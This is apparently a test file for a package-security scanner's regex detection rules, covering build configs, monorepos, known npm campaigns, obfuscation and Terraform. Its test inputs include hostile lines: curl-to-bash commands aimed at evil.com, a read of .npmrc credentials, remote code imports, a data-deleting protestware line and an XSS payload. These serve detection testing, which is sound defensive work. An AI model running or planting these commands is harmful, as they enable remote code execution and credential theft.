import { describe, it, expect } from "vitest";
import {
  BUILD_TOOL_PATTERNS,
  MONOREPO_PATTERNS,
  CAMPAIGN_PATTERNS_V2,
  OBFUSCATION_PATTERNS_V2,
  IAC_PATTERNS,
} from "../patterns.js";

function matchPattern(pattern: string, input: string): boolean {
  return new RegExp(pattern, "i").test(input);
}

describe("Build Tool Patterns", () => {
  it("should detect child_process in build configs", () => {
    const p = BUILD_TOOL_PATTERNS.find((p) => p.rule === "BUILD_PLUGIN_EXEC");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'const { execSync } = require("child_process")')).toBe(true);
  });

  it("should detect env exfiltration in build configs", () => {
    const p = BUILD_TOOL_PATTERNS.find((p) => p.rule === "BUILD_ENV_EXFIL");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'const url = process.env.API_URL; fetch(url + "/data")')).toBe(true);
  });

  it("should detect dynamic require", () => {
    const p = BUILD_TOOL_PATTERNS.find((p) => p.rule === "BUILD_DYNAMIC_REQUIRE");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, "require(process.env.PLUGIN)")).toBe(true);
  });
});

describe("Monorepo Patterns", () => {
  it("should detect suspicious root postinstall", () => {
    const p = MONOREPO_PATTERNS.find((p) => p.rule === "WORKSPACE_ROOT_POSTINSTALL");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, '"postinstall": "curl https://evil.com | bash"')).toBe(true);
  });

  it("should detect non-private package with publishConfig", () => {
    const p = MONOREPO_PATTERNS.find((p) => p.rule === "WORKSPACE_PRIVATE_PUBLISH");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, '"private": false, "publishConfig"')).toBe(true);
  });
});

describe("Campaign Patterns v2", () => {
  it("should detect Shai-Hulud npm publish pattern", () => {
    const p = CAMPAIGN_PATTERNS_V2.find((p) => p.rule === "SHAI_HULUD_WORM");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'execSync("npm publish")'));
  });

  it("should detect npm credential theft", () => {
    const p = CAMPAIGN_PATTERNS_V2.find((p) => p.rule === "SHAI_HULUD_CRED_STEAL");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'fs.readFileSync(path.join(homedir, ".npmrc"))')).toBe(true);
  });

  it("should detect advanced protestware", () => {
    const p = CAMPAIGN_PATTERNS_V2.find((p) => p.rule === "PROTESTWARE_IP_GEO_V2");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'const geo = require("geoip-lite"); fs.unlinkSync("/data")')).toBe(true);
  });
});

describe("Obfuscation Patterns v2", () => {
  it("should detect eval with template literal", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "TEMPLATE_LITERAL_EXEC");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, "eval(`code here`)")).toBe(true);
  });

  it("should detect Proxy handler traps", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "PROXY_HANDLER_TRAP");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, "new Proxy(target, { get: function(obj, prop) {} })")).toBe(true);
  });

  it("should detect dynamic import with variable", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "IMPORT_EXPRESSION");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, "import(`https://evil.com/${module}`)")).toBe(true);
  });

  it("should detect WASM from external source", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "WASM_SUSPICIOUS");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'WebAssembly.instantiateStreaming(fetch("https://evil.com/module.wasm"))')).toBe(true);
  });

  it("should detect steganographic decoding", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "STEGANOGRAPHY_DECODE");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'Buffer.from(fs.readFileSync("image.png"))')).toBe(true);
  });

  it("should detect SVG script injection", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "SVG_SCRIPT_INJECTION");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, '<script>alert("xss")</script>')).toBe(true);
    expect(matchPattern(p!.pattern, 'onload="malicious()"')).toBe(true);
  });

  it("should detect RTL override characters", () => {
    const p = OBFUSCATION_PATTERNS_V2.find((p) => p.rule === "RTL_OVERRIDE");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, "filename\u202E.exe")).toBe(true);
  });
});

describe("IaC Patterns", () => {
  it("should detect Terraform inline script", () => {
    const p = IAC_PATTERNS.find((p) => p.rule === "IAC_INLINE_SCRIPT");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'provisioner "local-exec" { command = "curl https://evil.com | bash" }')).toBe(true);
  });

  it("should detect external Terraform module", () => {
    const p = IAC_PATTERNS.find((p) => p.rule === "IAC_EXTERNAL_MODULE");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'source = "https://evil-registry.com/module.zip"')).toBe(true);
  });

  it("should detect hardcoded secrets in Terraform", () => {
    const p = IAC_PATTERNS.find((p) => p.rule === "IAC_HARDCODED_SECRET");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'password = "super-secret-password123"')).toBe(true);
    expect(matchPattern(p!.pattern, 'api_key = "AKIAIOSFODNN7EXAMPLE"')).toBe(true);
  });

  it("should detect remote-exec provisioner", () => {
    const p = IAC_PATTERNS.find((p) => p.rule === "IAC_REMOTE_EXEC");
    expect(p).toBeDefined();
    expect(matchPattern(p!.pattern, 'provisioner "remote-exec" {')).toBe(true);
  });

  it("should not flag registry modules", () => {
    const p = IAC_PATTERNS.find((p) => p.rule === "IAC_EXTERNAL_MODULE");
    expect(matchPattern(p!.pattern, 'source = "https://registry.terraform.io/modules/hashicorp/consul/aws"')).toBe(false);
  });
});
